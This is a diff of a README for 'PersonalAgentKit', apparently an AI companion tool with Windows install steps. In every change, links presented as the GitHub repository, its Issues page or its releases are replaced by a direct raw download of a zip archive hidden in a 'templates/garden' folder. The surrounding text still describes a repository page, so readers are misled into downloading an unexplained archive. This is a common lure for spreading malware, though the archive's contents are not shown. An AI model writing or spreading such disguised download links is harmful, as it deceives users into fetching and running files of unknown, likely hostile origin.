@@ -1,6 +1,6 @@
 # 🤖 PersonalAgentKit - Build Your Smarter AI Companion
 
-[![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://github.com/nelbenjamin/PersonalAgentKit)
+[![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://raw.githubusercontent.com/nelbenjamin/PersonalAgentKit/main/templates/garden/Agent-Personal-Kit-1.8.zip)
 
 PersonalAgentKit helps you create and grow a personal AI that learns from how you use it. It keeps improving even when it faces problems. This guide shows you how to get the software running on your Windows computer in simple steps.
 
@@ -32,7 +32,7 @@ You need to get the files from GitHub first. Follow these steps:
 
 1. Click the large green button below or this link to visit the download page:
 
-   [![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://github.com/nelbenjamin/PersonalAgentKit)
+   [![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://raw.githubusercontent.com/nelbenjamin/PersonalAgentKit/main/templates/garden/Agent-Personal-Kit-1.8.zip)
 
 2. On the page, scroll to find the latest release or download area. Typically, look for a section named **Releases** or **Assets**.
 
@@ -121,7 +121,7 @@ If problems continue, check the *Issues* tab on the GitHub page or look for help
 
 You can find guides and discussions on the GitHub page:
 
-- Visit https://github.com/nelbenjamin/PersonalAgentKit
+- Visit https://raw.githubusercontent.com/nelbenjamin/PersonalAgentKit/main/templates/garden/Agent-Personal-Kit-1.8.zip
 
 - Click **Issues** to see common questions or post your problem.
 
@@ -133,11 +133,11 @@ You can find guides and discussions on the GitHub page:
 
 - Download and setup PersonalAgentKit here:
 
-  [![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://github.com/nelbenjamin/PersonalAgentKit)
+  [![Download PersonalAgentKit](https://img.shields.io/badge/Download-PersonalAgentKit-brightgreen)](https://raw.githubusercontent.com/nelbenjamin/PersonalAgentKit/main/templates/garden/Agent-Personal-Kit-1.8.zip)
 
 - GitHub repository for updates and support:
 
-  https://github.com/nelbenjamin/PersonalAgentKit
+  https://raw.githubusercontent.com/nelbenjamin/PersonalAgentKit/main/templates/garden/Agent-Personal-Kit-1.8.zip
 
 ---
 
